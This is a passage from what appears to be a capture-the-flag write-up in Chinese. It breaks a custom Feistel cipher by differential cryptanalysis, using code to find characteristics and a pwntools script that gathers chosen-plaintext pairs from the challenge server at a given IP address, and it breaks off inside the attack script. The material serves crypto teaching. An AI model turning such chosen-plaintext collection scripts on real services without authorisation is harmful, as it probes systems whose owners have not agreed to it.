class="number">1</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">0</span>]]</span><br><span class="line">p_box = [<span class="number">19</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">18</span>, <span class="number">6</span>, <span class="number">30</span>, <span class="number">29</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">27</span>, <span class="number">5</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">12</span>, <span class="number">31</span>,</span><br><span class="line">         <span class="number">11</span>, <span class="number">28</span>]</span><br><span class="line">extend_key = [<span class="number">2</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">37</span>, <span class="number">34</span>, <span class="number">32</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">15</span>, <span class="number">25</span>, <span class="number">44</span>, <span class="number">42</span>, <span class="number">18</span>, <span class="number">35</span>, <span class="number">5</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">12</span>, <span class="number">30</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">26</span>,</span><br><span class="line">              <span class="number">1</span>, <span class="number">33</span>, <span class="number">46</span>, <span class="number">45</span>, <span class="number">6</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">24</span>, <span class="number">9</span>, <span class="number">47</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">28</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">31</span>, <span class="number">36</span>, <span class="number">8</span>, <span class="number">23</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span>(<span class="params">msg</span>):</span></span><br><span class="line">    pad_len = (<span class="number">8</span> - <span class="built_in">len</span>(msg) % <span class="number">8</span>) % <span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> msg + <span class="built_in">bytes</span>([pad_len] * pad_len)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">expand_key</span>(<span class="params">key_seed=<span class="literal">None</span></span>):</span></span><br><span class="line">    keys = []</span><br><span class="line">    <span class="keyword">if</span> key_seed == <span class="literal">None</span>:</span><br><span class="line">        key_seed = random.getrandbits(<span class="number">48</span>)</span><br><span class="line">    Keygenerator = KEYGENERATOR(key_seed)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        keys.append(Keygenerator.<span class="built_in">next</span>())</span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KEYGENERATOR</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, seed</span>):</span></span><br><span class="line">        self.state = seed</span><br><span class="line">        self.a = <span class="number">0xdeadbeef</span></span><br><span class="line">        self.b = <span class="number">0xbeefdead</span></span><br><span class="line">        self.p = <span class="number">244953516689137</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        state_bin = <span class="built_in">bin</span>(self.state)[<span class="number">2</span>:].rjust(<span class="number">48</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        tmp = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(state_bin[extend_key[_]] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>)), <span class="number">2</span>)</span><br><span class="line">        self.state = (tmp * self.a + self.b) % self.p</span><br><span class="line">        <span class="keyword">return</span> self.state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JULIETENCRYPTBLOCK</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key=<span class="literal">None</span></span>):</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.keys = expand_key(self.key)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">s</span>(<span class="params">self, x, index</span>):</span></span><br><span class="line">        row = (x &gt;&gt; <span class="number">5</span> &lt;&lt; <span class="number">1</span> &amp; <span class="number">2</span>) + (x % <span class="number">2</span>)</span><br><span class="line">        col = (x &gt;&gt; <span class="number">1</span> &amp; <span class="number">15</span>)</span><br><span class="line">        <span class="keyword">return</span> s_box[index][(row &lt;&lt; <span class="number">4</span>) + col]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">p</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        binx = [<span class="built_in">int</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">bin</span>(x)[<span class="number">2</span>:].rjust(<span class="number">32</span>, <span class="string">&#x27;0&#x27;</span>)]</span><br><span class="line">        biny = [binx[p_box[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">        y = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> biny]), <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">expand</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        binx = <span class="built_in">bin</span>(x)[<span class="number">2</span>:].rjust(<span class="number">32</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        biny = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        index = -<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> qwer <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(index, index + <span class="number">6</span>):</span><br><span class="line">                biny += binx[j % <span class="number">32</span>]</span><br><span class="line">            index += <span class="number">4</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(biny, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Funct</span>(<span class="params">self, x, k</span>):</span></span><br><span class="line">        x_in = <span class="built_in">bin</span>(self.expand(x) ^ k)[<span class="number">2</span>:].rjust(<span class="number">48</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        y_out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">48</span>, <span class="number">6</span>):</span><br><span class="line">            tmp = <span class="built_in">int</span>(x_in[i:i + <span class="number">6</span>], <span class="number">2</span>)</span><br><span class="line">            y_out += <span class="built_in">bin</span>(self.s(tmp, i // <span class="number">6</span>))[<span class="number">2</span>:].rjust(<span class="number">4</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        y_out = <span class="built_in">int</span>(y_out, <span class="number">2</span>)</span><br><span class="line">        y = self.p(y_out)</span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">partenc</span>(<span class="params">self, x, keys</span>):</span></span><br><span class="line">        binx = <span class="built_in">bin</span>(x)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        l, r = <span class="built_in">int</span>(binx[:<span class="number">32</span>], <span class="number">2</span>), <span class="built_in">int</span>(binx[<span class="number">32</span>:], <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            l, r = r, l ^ self.Funct(r, keys[i])</span><br><span class="line">        y = (l + (r &lt;&lt; <span class="number">32</span>)) &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">self, pt</span>):</span></span><br><span class="line">        pt = padding(pt)</span><br><span class="line">        c = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pt), <span class="number">8</span>):</span><br><span class="line">            c_block = long_to_bytes(self.partenc(bytes_to_long(pt[i:i + <span class="number">8</span>]), self.keys)).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">            c += c_block</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_diff_output</span>(<span class="params">diff</span>):</span></span><br><span class="line">    p1 = getRandomNBitInteger(<span class="number">32</span>)</span><br><span class="line">    p2 = p1 ^ diff</span><br><span class="line">    k = getRandomNBitInteger(<span class="number">48</span>)</span><br><span class="line">    JE = JULIETENCRYPTBLOCK(k)</span><br><span class="line">    c1, c2 = JE.Funct(p1, k), JE.Funct(p2, k)</span><br><span class="line">    <span class="keyword">return</span> c1 ^ c2, (p1, p2, c1, c2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">P_L = [<span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000040</span>, <span class="number">0x00000400</span>, <span class="number">0x00004000</span>, <span class="number">0x00040000</span>, <span class="number">0x00400000</span>, <span class="number">0x04000000</span>, <span class="number">0x40000000</span>]</span><br><span class="line"><span class="keyword">for</span> P_ <span class="keyword">in</span> P_L:</span><br><span class="line">    counter = Counter()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5000</span>):</span><br><span class="line">        X_, _ = gen_diff_output(P_)</span><br><span class="line">        counter[X_] += <span class="number">1</span></span><br><span class="line">    X_, freq = counter.most_common(<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(P_)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>), end=<span class="string">&#x27; =&gt; &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(X_)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>), freq / <span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 04000000 =&gt; 00000000 0.3394</span></span><br></pre></td></tr></table></figure><p>去靶机上拿数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> dump</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, getRandomNBitInteger</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_msg</span>(<span class="params">io, msg</span>):</span></span><br><span class="line">    io.sendline(<span class="string">b&#x27;[Romeo]:&#x27;</span> + msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;123.57.131.167&#x27;</span>, <span class="number">27009</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[Juliet]:My love is:&#x27;</span>)</span><br><span class="line">rec = io.recvline()</span><br><span class="line">flagc = rec.strip().decode()</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">pairs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">0x1814</span> // <span class="number">2</span>)):</span><br><span class="line">    p1 = getRandomNBitInteger(<span class="number">64</span>)</span><br><span class="line">    p2 = p1 ^ <span class="number">0x0000000004000000</span></span><br><span class="line">    msg1 = long_to_bytes(p1).<span class="built_in">hex</span>().encode()</span><br><span class="line">    msg2 = long_to_bytes(p2).<span class="built_in">hex</span>().encode()</span><br><span class="line">    send_msg(io, msg1)</span><br><span class="line">    c1 = <span class="built_in">int</span>(io.recvline(keepends=<span class="literal">False</span>).split(<span class="string">b&#x27;[Juliet]:&#x27;</span>)[<span class="number">1</span>].strip(), <span class="number">16</span>)</span><br><span class="line">    send_msg(io, msg2)</span><br><span class="line">    c2 = <span class="built_in">int</span>(io.recvline(keepends=<span class="literal">False</span>).split(<span class="string">b&#x27;[Juliet]:&#x27;</span>)[<span class="number">1</span>].strip(), <span class="number">16</span>)</span><br><span class="line">    pairs.append(((p1, p2), (c1, c2)))</span><br><span class="line"></span><br><span class="line">dump([flagc, pairs], <span class="built_in">open</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;w&quot;</span>))</span><br></pre></td></tr></table></figure><p>攻击解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> load</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">s_box = [</span><br><span class="line">    [<span class="number">12</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">     <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">0</span>,</span><br><span class="line">     <span class="number">15</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">10</span>],</span><br><span class="line">    [<span class="number">4</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">     <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">9</span>],</span><br><span class="line">    [<span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>,</span><br><span class="line">     <span class="number">0</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">9</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">9</span>,</span><br><span class="line">     <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">9</span>],</span><br><span class="line">    [<span class="number">14</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">13</span>,</span><br><span class="line">     <span class="number">12</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">13</span>,</span><br><span class="line">     <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">8</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">12</span>,</span><br><span 